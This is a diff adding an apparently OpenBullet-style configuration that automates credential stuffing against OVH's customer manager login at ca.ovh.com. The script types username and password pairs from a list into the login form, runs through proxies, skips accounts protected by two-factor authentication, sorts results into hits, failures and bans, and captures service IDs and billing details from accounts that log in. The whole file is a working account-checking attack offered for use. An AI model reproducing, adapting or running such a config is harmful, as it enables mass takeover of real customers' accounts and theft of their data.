@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "ca.ovh",
+  "SuggestedBots": 1,
+  "LastModified": "2018-11-04T20:25:15.5913088+00:00",
+  "AdditionalInfo": "",
+  "Author": "soot",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+BROWSERACTION Open "" 
+#CLEARCOOKIES BROWSERACTION ClearCookies "" 
+NAVIGATE "https://ca.ovh.com/auth/?action=disconnect&onsuccess=https%3A%2F%2Fca.ovh.com%2Fmanager%2F%23%2Fbilling%2FautoRenew" 60 
+#CLEAR_USER ELEMENTACTION XPath "//*[@placeholder=\"Email\"]" 
+  Clear "" -> VAR "" 
+#CLEAR_PASS ELEMENTACTION XPath "//*[@placeholder=\"Password\"]" 
+  Clear "" -> VAR "" 
+#USER ELEMENTACTION XPath "//*[@placeholder=\"Email\"]" 
+  SendKeys "<USER>" -> VAR "" 
+#PASS ELEMENTACTION XPath "//*[@placeholder=\"Password\"]" 
+  SendKeys "<PASS>" -> VAR "" 
+#CLICK ELEMENTACTION XPath "//*[@id=\"login-form\"]/div[1]/form/div[4]/div/button" 
+  Click "" -> VAR "" 
+#WAIT_FOR_ERROR_MSG ELEMENTACTION Class "error" 
+  WaitForElement "15" -> VAR "" 
+ELEMENTACTION Class "error" 
+  GetText "" -> VAR "ERRORMSG" 
+#2FA ELEMENTACTION Name "change2FA" 
+  GetAttribute "value" -> VAR "2FA" 
+IF "<ERRORMSG>" Contains "Invalid"
+JUMP #KEYCHECK1
+ENDIF
+
+IF "<2FA>" EqualTo "totp"
+JUMP #KEYCHECK1
+ENDIF
+
+#WAIT_FOR_INFO ELEMENTACTION XPath "//span[@data-translate='autorenew_empty']" 
+  WaitForElement "20" -> VAR "" 
+ELEMENTACTION XPath "//span[@data-translate='autorenew_empty']" 
+  GetText "" -> VAR "CHKSERV" 
+#KEYCHECK1 KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" AND 
+    KEY "<CHKSERV>" Contains "service" 
+  KEYCHAIN Failure AND 
+    KEY "<ERRORMSG>" Contains "Invalid Account ID" 
+  KEYCHAIN Ban AND 
+    KEY "<ERRORMSG>" Contains "authentication failures" 
+  KEYCHAIN Failure AND 
+    KEY "<2FA>" Contains "totp" 
+ELEMENTACTION XPath "//span[contains(@data-ng-bind,'::service.serviceId')]" 
+  WaitForElement "30" -> VAR "" 
+ELEMENTACTION XPath "//span[contains(@data-ng-bind,'::service.serviceId')]" Recursive=TRUE 
+  GetText "" -> CAP "Service" 
+ELEMENTACTION XPath "(//span[contains(@data-ng-bind,'$ctrl.content')])" Recursive=TRUE 
+  GetText "" -> CAP "Info" 
+ELEMENTACTION XPath "//span[contains(@data-ng-bind,'::service.serviceId')]" 
+  GetText "" -> VAR "RECHECK" 
+#KEYCHECK2 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success AND 
+    KEY "<CHKSERV>" DoesNotContain "service" 
+    KEY "<ERRORMSG>" DoesNotContain "Invalid" 
+    KEY "<ADDRESS>" Contains "manager/#/billing" 
+    KEY "<RECHECK>" NotEqualTo "" 
+BROWSERACTION ClearCookies "" 
